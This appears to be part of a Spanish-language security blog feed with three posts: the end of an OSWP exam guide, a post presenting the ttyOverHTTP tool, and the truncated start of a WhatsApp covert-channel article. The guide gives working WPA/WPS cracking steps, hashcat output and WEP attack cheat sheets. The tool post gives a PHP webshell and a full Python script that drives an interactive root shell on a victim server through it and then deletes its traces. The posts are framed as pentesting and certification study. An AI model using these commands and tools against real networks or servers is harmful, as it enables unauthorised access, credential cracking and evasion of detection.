Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
Progress.........: 15218868/28688774 (53.05%)
Rejected.........: 5388468/15218868 (35.41%)
Restore.Point....: 7545850/14344387 (52.60%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2816-2944
Candidates.#1....: horneybabe1987 -&gt; groovejet
Hardware.Mon.#1..: Temp: 86c Util: 99% Core:1632MHz Mem:3504MHz Bus:8

Approaching final keyspace - workload adjusted.  

2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXX
                                                 
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 (3 mins, 36 secs)
Time.Estimated...: Mon Aug 12 22:51:40 2019 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    88906 H/s (47.34ms) @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts
Progress.........: 28688774/28688774 (100.00%)
Rejected.........: 9469826/28688774 (33.01%)
Restore.Point....: 14344387/14344387 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 0133112024erdalk -&gt; KqpsEFunpo7w29nrbx4H
Hardware.Mon.#1..: Temp: 88c Util: 99% Core:1632MHz Mem:3504MHz Bus:8

Started: Mon Aug 12 22:48:02 2019
Stopped: Mon Aug 12 22:51:42 2019
```

O también:

```bash
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #cat myHashes 
0d4191730a005481706436bdbc50919c*fcb4e699a909*b0febdab6d9d*4d4f5649535441525f41393038
2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #hashcat -m 16800 --show myHashes 
2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXXXXXX
```

### Ataques por WPS

Ya como casi último de los puntos a tratar para redes de protocolo **WPA/WPA2**, no puedo acabar la sección
sin mencionar el famoso **WPS**.

Desde mi experiencia, os podría estar comentando ahora mismo cómo usar **pixiedust**, **reaver** o derivados,
pero prefiero mostraros herramientas de utilidad que realmente den resultados, o que por lo menos tengan una
tasa de éxito más probable.

#### Uso de WPSPinGenerator

Si os fijáis, en todo el **Gist**, hemos hecho la gran parte de procedimientos a mano, me refiero, sin hacer
uso de herramientas automatizadas. No suelo acostumbrar a hacer uso de herramientas que te automatizan un
procedimiento, sobre todo por la curiosidad que me causa el cómo funciona esa por debajo. Sin embargo, para
este caso, hay una de ellas especialmente destinadas a **WPS** que sí que utilizo, por la gran tasa de acierto
de la que dispone.

El sistema operativo **Wifislax**, se podría decir que es un sistema operativo orientado al Hacking y
Auditoría WiFi. Cuenta con bastantes herramientas de automatización como Fluxion, Linset o Wifimosys que
automatizan todo lo que nosotros hemos estado haciendo a mano. Es un OS principalmente orientados a **Script
Kiddies**.

Una de las herramientas de **Wifislax** que uso con bastante frecuencia es **WPSPinGenerator**, por no decir
que es la única herramienta que utilizo de este OS. ¿Qué nos permite hacer **WPSPinGenerator**?, veámoslo con un ejemplo práctico.

Al principio, es necesario seleccionar la interfaz de red con la que trabajar, especificar los canales sobre
los cual queremos escanear, en fin... lo típico. Esta parte me la saltaré.

Una vez escaneamos las redes disponibles de nuestro entorno, vemos algo como esto:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wc39.png&quot;&gt;

Si nos fijamos, vemos que para cada red inalámbrica, se nos dice si esta cuenta o no con un PIN genérico.
(Recomiendo que leas cómo funciona la asociación a través de PIN).

Una vez seleccionamos la red, fijaros que interesante:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wc3a.png&quot;&gt;

Nos lista los posibles PINES para esa red. Generalmente, a los 3 intentos, el router bloquea el WPS para que
no se puedan enviar más solicitudes. Sin embargo, a veces en vez de ser 5 pines, la herramienta nos reporta 2,
o incluso 1.

Para este caso, que son 5, el PIN correcto estaba en la primera posición (no es mi red), y tras seleccionar la
opción **2**, obtenemos los siguientes resultados:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wc3g.png&quot;&gt;

La contraseña de la red inalámbrica en texto claro directamente. Por si no la ves bien:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wc3q.png&quot;&gt;

¿Lo bueno de esto?, que no importa cuantas veces cambies la contraseña... pues si el PIN sigue siendo el mismo
para la eternidad, como atacantes siempre vamos a ser capaces de verla en cuestión de segundos,
independientemente de su longitud o robustez.

### Redes WPA Ocultas

Ya para acabar este Gist, os cito una técnica para redes WPA que están configuradas como ocultas.

Generalmente, desde **aircrack**, se listan las redes ocultas de esta forma:

`&lt;length: 0&gt;`

¿Qué hacemos en este caso cuando la red está oculta?, bueno, sabemos que a nivel de filtrado no vamos a tener
problema... pues filtramos por la **BSSID** y problema resuelto. Sin embargo, hay un pequeño fallo de esta
configuración que nos permite dar con la **ESSID** del AP.

Si efecutamos un ataque de de-autenticación global para expulsar a todos los clientes (o dirigido en caso de
que haya sólo uno), cuando estos tratan de re-asociarse al AP, uno de los paquetes que mandan ya hemos visto que son los **Probe Request**:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==4&quot; 2&gt;/dev/null
   59 3.094674701 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=1378, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
   63 3.304134536 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=1379, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
   98 4.671950803 Apple_48:66:14 → Broadcast    802.11 213 Probe Request, SN=1113, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  100 4.682076898 Apple_48:66:14 → Broadcast    802.11 213 Probe Request, SN=1114, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
```

Perfecto, pues de estos paquetes, siempre el primero emitido antes de empezar con la fase de asociación emite
por defecto el **ESSID** de la red en texto claro, de manera no oculta y transparente para el atacante.

De esta forma, podemos ser capaces de extraer el **ESSID** de la red tras aplicar un ataque de
de-autenticación sobre una de las estaciones presentes. ¿Pero qué es lo bueno de esto?, que ni nosotros
tenemos que hacer el trabajo. Una vez la propia suite de **aircrack** detecta estos paquetes Probe, los parsea
en busca del **ESSID** de la red oculta. En caso de obtenerla, sustituye el campo `&lt;length: 0&gt;` por el **ESSID** descubierto, automáticamente.

## Redes WEP

**IMPORTANTE: En este punto, no entraré tanto al detalle como en las redes de protocolo WPA. ¿Por qué?, porque
ya para eso tienes todo el material necesario que te entregan tras cursar la certificación, que se orienta a
vulnerar el protocolo WEP. Todo lo visto hasta ahora, han sido técnicas que os quería compartir sobre el
protocolo WPA/WPA2, ya que es el más usado a día de hoy y el que con más frecuencia nos vamos a encontrar en nuestro entorno.**

Aún así, dejo un **Cheat Sheet** para cada uno de los casos.

### Fake Authentication Attack

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon
# Identificamos nuestra MAC
s4vitar@parrot:~# macchanger --show wlan0mon
s4vitar@parrot:~# aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -e &lt;ESSID&gt; wlan0mon
s4vitar@parrot:~# aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
s4vitar@parrot:~# aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt;
```

### ARP Replay Attack

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon
# Identificamos nuestra MAC
s4vitar@parrot:~# macchanger --show wlan0mon
s4vitar@parrot:~# aireplay-ng -3 –x 1000 –n 1000 –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
s4vitar@parrot:~# aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt;
```

### Chop Chop Attack

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon
# Identificamos nuestra MAC
s4vitar@parrot:~# macchanger --show wlan0mon
s4vitar@parrot:~# aireplay-ng -1 0 –e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
s4vitar@parrot:~# aireplay-ng -4 –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
 # Presionamos ‘y’ ;
s4vitar@parrot:~# packetforge-ng -0 –a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt;
s4vitar@parrot:~# aireplay-ng -2 –r &lt;FileName2&gt; wlan0mon
s4vitar@parrot:~# aircrack-ng &lt;archivoPCAP&gt;
```

### Fragmentation Attack

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon
# Identificamos nuestra MAC
s4vitar@parrot:~# macchanger --show wlan0mon
s4vitar@parrot:~# aireplay-ng -1 0 –e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
s4vitar@parrot:~# aireplay-ng -5 –b&lt;BSSID&gt; -h &lt;nuestraMAC &gt; wlan0mon
# Presionamos ‘y’ ;
s4vitar@parrot:~# packetforge-ng -0 –a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt;
s4vitar@parrot:~# aireplay-ng -2 –r &lt;FileName2&gt; wlan0mon
s4vitar@parrot:~# aircrack-ng &lt;archivoPCAP&gt;
```

### SKA Type Cracking

```bash
s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon
s4vitar@parrot:~# aireplay-ng -0 10 –a &lt;BSSID&gt; -c &lt;macVictima&gt; wlan0mon
s4vitar@parrot:~# ifconfig wlan0mon down
s4vitar@parrot:~# macchanger –-mac &lt;macVictima&gt; wlan0mon
s4vitar@parrot:~# ifconfig wlan0mon up
s4vitar@parrot:~# aireplay-ng -3 –b &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon
s4vitar@parrot:~# aireplay-ng –-deauth 1 –a &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon
s4vitar@parrot:~# aircrack-ng &lt;archivoPCAP&gt;
```</content><author><name>J0hnTena</name></author><category term="OSWP" /><category term="Offensive Security" /><category term="Pentesting" /><category term="Examen" /><category term="Guías" /><summary type="html">Para aquellos interesados en certificarse de OSWP, por aquí os dejo una guía hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinación.</summary></entry><entry><title type="html">ttyOverHTTP - Herramienta</title><link href="http://localhost:4000/ttyoverhttp/" rel="alternate" type="text/html" title="ttyOverHTTP - Herramienta" /><published>2020-02-04T00:00:00-06:00</published><updated>2020-02-04T00:00:00-06:00</updated><id>http://localhost:4000/ttyoverhttp</id><content type="html" xml:base="http://localhost:4000/ttyoverhttp/">![](/assets/images/ttyOverHTTP/linux-banner.png)

Podéis encontrar esta herramienta en el siguiente enlace:

* [https://github.com/s4vitar/ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)

## ¿Qué es ttyOverHTTP?

**ttyOverHTTP** no es más que una herramienta de utilidad la cual nos permitirá en base a una webshell, sin la necesidad de entablarnos una reverse shell, contar con una TTY completamente interactiva, haciendo uso para ello de la utilidad `mkfifo`.

Para los que no entiendan la problemática de las webshells, podéis probarlo por vuestra cuenta... simplemente montad un servidor apache y alojad este recurso PHP en la ruta `/var/www/html/cmd.php`:

```php
&lt;?php
    echo shell_exec($_REQUEST['cmd']);
?&gt;
```

Como es de esperar, a través de la variable `cmd` está más que claro que vamos a ser capaces de ejecutar comandos a nivel de sistema como el usuario `www-data`:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ttyOverHTTP/first-webserver.png&quot;&gt;
&lt;/p&gt;

Sin embargo, fijaros qué es lo que pasa si tratamos por ejemplo de efectuar una migración de usuario:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ttyOverHTTP/second-webserver.png&quot;&gt;
&lt;/p&gt;

No podemos introducir la contraseña del usuario `root`, cosa que podríamos hacer si hiciéramos un tratamiento de la TTY desde consola, ya sabéis... el `stty raw -echo` y toda la movida.

De la misma forma, tampoco podemos correr desde una webshell el servicio `mysql` o `php` en modo interactivo, ni hacer un `sudo su` para introducir la contraseña. Tampoco podemos hacer desplazamientos entre directorios, me refiero... si hacemos `pwd` veremos la ruta actual en la que nos situamos, pero si luego enviamos un `cd /home` y volvemos en la siguiente consulta a hacer un `pwd` veremos que seguiremos en el mismo directorio inicial, no habiéndose efectuado el desplazamiento.

Todo esto sucede porque básicamente no estamos en una TTY, podemos comprobarlo de la siguiente forma:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ttyOverHTTP/third-webserver.png&quot;&gt;
&lt;/p&gt;

Entonces bien, ¿qué hacemos en estos casos?, porque si nos entabláramos una Reverse Shell obviamente ya todo estaría hecho, ¿pero y si por iptables hay ciertas reglas configuradas tanto por ipv4 como por ipv6 que impiden conexiones salientes para entablarnos nuestra conexión?. 

Efectivamente, se nos complica un poco la labor.

## Movimiento lateral

En Linux, hay una utilidad que nos permite crear archivos **FIFO**. Un fichero FIFO es similar a una interconexión o tubería, excepto en que se crea de una forma distinta. En vez de ser un canal de comunicaciones anónimo, un fichero especial FIFO se mete en el sistema de ficheros mediante una llamada a **mkfifo**.

Veamos un ejemplo práctico de su uso. Por un lado desde terminal, haremos lo siguiente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $mkfifo input; tail -f input | /bin/sh 2&gt;&amp;1 &gt; output
```

Esto se quedará en escucha, por lo que posteriormente deberemos abrir una nueva consola aparte para hacer las pruebas. Ahora haremos lo siguiente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $ls
input  output
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo &quot;whoami&quot; &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output 
s4vitar
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo &quot;pwd&quot; &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo &quot;cd ..&quot; &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo &quot;pwd&quot; &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output 
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
```

Si os fijáis, para cada comando proporcionado en `input`, se nos lista el resultado del comando aplicado a nivel de sistema en el fichero `output`.

Ojo cuidado, esto sigue sin ser una TTY, sin embargo... podemos hacer lo siguiente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo &quot;script /dev/null -c bash&quot; &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output 
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

Fijaros cómo ahora se nos abre una consola aparte de la nuestra al leer el ficherito `output`. Tal vez lo veis mejor así:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output; echo
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

Ahí está. La superior a la de abajo del todo es la gestionada desde los ficheros `input` y `output`. ¿Qué es lo mejor de todo?, lo siguiente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo &quot;tty&quot; &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output; echo
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $tty
/dev/pts/4
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

Ya estamos en una TTY, y a partir de aquí es sencillo aprovechar al máximo las utilidades de consola:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo &quot;php --interactive&quot; &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo '$word = &quot;Hola&quot;;' &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo 'echo $word;' &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo 'quit' &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo 'whoami' &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $tty
/dev/pts/4
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $php --interactive
Interactive mode enabled

php &gt; $word = &quot;Hola&quot;;
php &gt; echo $word;
Hola
php &gt; quit
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $whoami
s4vitar
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

De igual manera, podemos efectuar migraciones de usuario o convertirnos en root proporcionando la contraseña:

```go
─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo &quot;sudo su&quot; &gt; input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo &quot;************&quot; &gt; input # Aquí pondríais vuestra contraseña
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output ; echo
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $tty
/dev/pts/4
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $php --interactive
Interactive mode enabled

php &gt; $word = &quot;Hola&quot;;
php &gt; echo $word;
Hola
php &gt; quit
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $whoami
s4vitar
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $sudo su
[sudo] password for s4vitar: 
┌─[root@parrot]─[~/Desktop]
└──╼ #
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

El único problema es que el fichero `output` va almacenando el resultado de los comandos anteriormente ejecutados desde consola introducidos en `input`, por lo que por cada vez que abramos el `output`, veremos este histórico.

Aún así, está todo pensado... no os preocupéis. ¿Cuál es la idea ahora?, pues aprovechar este principio para construir una utilidad en Python la cual nos permita comunicarnos, mediante la webshell previamente creada, con estos ficheritos `input` y `output` depositados sobre el sistema víctima explotando para ello la utilidad `mkfifo`.

Haríamos uso de la siguiente utilidad en Python3:

```python
#!/usr/bin/python3

import requests, time, threading, pdb, signal, sys
from base64 import b64encode
from random import randrange

class AllTheReads(object):
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()

	def run(self):
		readoutput = &quot;&quot;&quot;/bin/cat %s&quot;&quot;&quot; % (stdout)
		clearoutput = &quot;&quot;&quot;echo '' &gt; %s&quot;&quot;&quot; % (stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				RunCmd(clearoutput)
				print(output)
			time.sleep(self.interval)

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
        	'cmd' : 'echo &quot;%s&quot; | base64 -d | sh' %(cmd)
		}
	result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
	return result

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo &quot;%s&quot; | base64 -d &gt; %s' % (cmd, stdin)
	}
	result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
	return result

def ReadCmd():
        GetOutput = &quot;&quot;&quot;/bin/cat %s&quot;&quot;&quot; % (stdout)
        output = RunCmd(GetOutput)
        return output

def SetupShell():
	NamedPipes = &quot;&quot;&quot;mkfifo %s; tail -f %s | /bin/sh 2&gt;&amp;1 &gt; %s&quot;&quot;&quot; % (stdin, stdin, stdout)
	try:
		RunCmd(NamedPipes)
	except:
		None
	return None

global stdin, stdout
session = randrange(1000, 9999)
stdin = &quot;/dev/shm/input.%s&quot; % (session)
stdout = &quot;/dev/shm/output.%s&quot; % (session)
erasestdin = &quot;&quot;&quot;/bin/rm %s&quot;&quot;&quot; % (stdin)
erasestdout = &quot;&quot;&quot;/bin/rm %s&quot;&quot;&quot; % (stdout)

SetupShell()

ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
	print(&quot;\n\n[*] Exiting...\n&quot;)
	print(&quot;[*] Removing files...\n&quot;)
	RunCmd(erasestdin)
	RunCmd(erasestdout)
	print(&quot;[*] All files have been deleted\n&quot;)
	sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

while True:
	cmd = input(&quot;&gt; &quot;)
	WriteCmd(cmd + &quot;\n&quot;)
	time.sleep(1.1)
```

* **Importante**: En este caso estamos tirando contra la `127.0.0.1` suponiendo que el fichero se llama `cmd.php`, en vuestro caso lo tendréis que cambiar a lo que os toque.

Entonces bien, imaginad que ya tenéis un archivo `cmd.php` alojado en el servidor víctima, pues mirad que sencillo:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $python3 ttyOverHTTP.py 
&gt; whoami
www-data
&gt; pwd
/var/www/html
&gt; cd /home
&gt; pwd
/home
&gt; ls -l
total 0
drwxr-xr-x 1 s4vitar s4vitar 1156 Feb  4 12:19 s4vitar
```

Ya directamente se gestiona desde el script la sesión, pudiendo así ver los outputs de los comandos que especifiquemos desde `input`. 

El procedimiento ahora para obtener una TTY y proseguir naturalmente sería el mismo que os mostré anteriormente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $python3 ttyOverHTTP.py 
&gt; whoami                  
www-data
&gt; script /dev/null -c bash
Script started, file is /dev/null
www-data@parrot:/var/www/html$
&gt; su s4vitar
su s4vitar
Password:
&gt; ************* # Aquí va vuestra contraseña

░▒▓    /var/w/html  ✔ ▓▒░                                                  
&gt; bash
bash
┌──[s4vitar@parrot]─[/var/www/html]
└──╼ $
&gt; whoami
whoami
s4vitar
┌──[s4vitar@parrot]─[/var/www/html]
└──╼ $
&gt; sudo su
sudo su
[sudo] password for s4vitar:
&gt; *********** # Aquí va vuestra contraseña

░▒▓    /var/w/html  ✔   ▓▒░                                                
bash
bash
┌──[root@parrot]─[/var/www/html]
└──╼ #
&gt; whoami
whoami
root
┌──[root@parrot]─[/var/www/html]
└──╼ #
&gt; 
```

Como podréis comprobar, tenemos una TTY completamente interactiva, pudiendo hacer todo lo que haríamos desde consola pero gestionado todo a través de una webshell. Y cómo no... no nos hemos entablado una Reverse Shell, buena esa.

Si presionáis la tecla `Ctrl+C`, se eliminarán todos los ficheros temporales del sistema víctima creados para gestionar la sesión, limpiando así el rastro que como atacantes estamos dejando bajo la ruta `/dev/shm/`.</content><author><name>J0hnTena</name></author><category term="Python" /><category term="Web Exploiting" /><category term="Herramientas" /><summary type="html">Utilidad en Python para obtener una TTY totalmente interactiva mediante explotación web sin necesidad de entablarse una Reverse Shell.</summary></entry><entry><title type="html">Canal encubierto en WhatsApp</title><link href="http://localhost:4000/canal-encubierto-whatsapp/" rel="alternate" type="text/html" title="Canal encubierto en WhatsApp" /><published>2020-02-03T00:00:00-06:00</published><updated>2020-02-03T00:00:00-06:00</updated><id>http://localhost:4000/canal-encubierto-whatsapp</id><content type="html" xml:base="http://localhost:4000/canal-encubierto-whatsapp/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/whatsapp-canal-encubierto/whatsapp-banner.jpeg&quot; width=&quot;500&quot;&gt;
&lt;/p&gt;

En el siguiente artículo, os muestro una forma de mantener conversaciones encubiertas sin que quede registro en el historial de conversaciones de WhatsApp. De esta forma, dos personas pueden mantener una conversación mediante la lectura de logs a tiempo de escritura sin necesidad de enviar el mensaje.

## Antecedentes

Para poder poner en práctica esta utilidad, en mi caso cuento con un servidor web alojado en [Heroku](https://www.heroku.com/). Este paso es opcional, vosotros podréis usar lo que queráis... incluso un servidor HTTP montado con Python desde vuestro VPS.

La URL que estaré utilizando para el canal encubierto será la siguiente:

* [http://s4vitar.herokuapp.com](http://s4vitar.herokuapp.com)

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/whatsapp-canal-encubierto/page-herokuapp.jpg&quot;&gt;
&lt;/p&gt;

Entonces bien, ¿cómo hacemos?, pues fijaros. Una de las utilidades de heroku es el comando `heroku logs -t` aplicado desde consola, donde podemos visualizar las peticiones a tiempo real en formato log que se están realizando contra el servidor. Para el que no cuente con `heroku` instalado en el sistema, podéis aplicar el comando `snap install heroku --classic` y ya lo tendríais. 

Posteriormente, deberéis aplicar el siguiente comando desde consola para iniciar sesión con vuestra cuenta:

```go
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #heroku login
heroku: Press any key to open up the browser to login or q to exit:
Opening browser to https://cli-auth.heroku.com/auth/cli/browser/35e6XXXX-XXXX-XXXX-87d0-bf7ff75XXXXX
heroku: Waiting for login... ⣟
```

Se os abrirá el navegador (en caso de que no se os abra, simplemente tenéis que acceder a la URL que se os proporciona). Una vez logueados, deberíais ver lo siguiente:

```go
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #heroku login
heroku: Press any key to open up the browser to login or q to exit: 
Opening browser to https://cli-auth.heroku.com/auth/cli/browser/35e6XXXX-XXXX-XXXX-87d0-bf7ff75XXXXX
Logging in... done
Logged in as s4vitarx@gmail.com
```

Os descargáis el repositorio correspondiente a la página web que se dispone de forma pública:

```go
┌─[root@parrot]─[/opt]
└──╼ #heroku git:clone -a s4vitar
Clonando en 's4vitar'...
remote: Counting objects: 10, done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 10 (delta 0), reused 0 (delta 0)
Desempaquetando objetos: 100% (10/10), listo.
┌─[root@parrot]─[/opt]
└──╼ #cd s4vitar
┌─[root@parrot]─[/opt/s4vitar]
└──╼ #ls
index.html
┌─[✗]─[root@parrot]─[/opt/s4vitar]
└──╼ #cat index.html 
Test
┌─[root@parrot]─[/opt/s4vitar]
└──╼ #
```

Y una vez situados dentro del directorio de vuestro proyecto, aplicáis el siguiente comando:

```go
┌─[root@parrot]─[/opt/s4vitar]
└──╼ #heroku logs -t
2020-02-03T11:15:21.183720+00:00 heroku[web.1]: Unidling
2020-02-03T11:15:21.187564+00:00 heroku[web.1]: State changed from down to starting
2020-02-03T11:15:21.218354+00:00 heroku[web.1]: Unidling
2020-02-03T11:15:21.233848+00:00 heroku[web.1]: State changed from down to starting
2020-02-03T11:15:22.506281+00:00 heroku[web.1]: Starting process with command `heroku-php-apache2`
2020-02-03T11:15:25.046504+00:00 app[web.1]: Optimizing defaults for 1X dyno...
2020-02-03T11:15:25.216868+00:00 app[web.1]: 4 processes at 128MB memory limit.
2020-02-03T11:15:25.222173+00:00 app[web.1]: Starting php-fpm...
2020-02-03T11:15:27.410773+00:00 heroku[web.1]: State changed from starting to up
2020-02-03T11:15:27.224962+00:00 app[web.1]: Starting httpd...
2020-02-03T11:15:28.234835+00:00 app[web.1]: 10.111.222.196 - - [03/Feb/2020:11:15:28 +0000] &quot;GET / HTTP/1.1&quot; 302 - &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
2020-02-03T11:15:28.278228+00:00 app[web.1]: 10.41.198.134 - - [03/Feb/2020:11:15:28 +0000] &quot;GET /robots.txt HTTP/1.1&quot; 404 208 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
2020-02-03T11:15:28.375383+00:00 app[web.1]: 10.111.222.196 - - [03/Feb/2020:11:15:28 +0000] &quot;GET /index.html HTTP/1.1&quot; 200 5 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
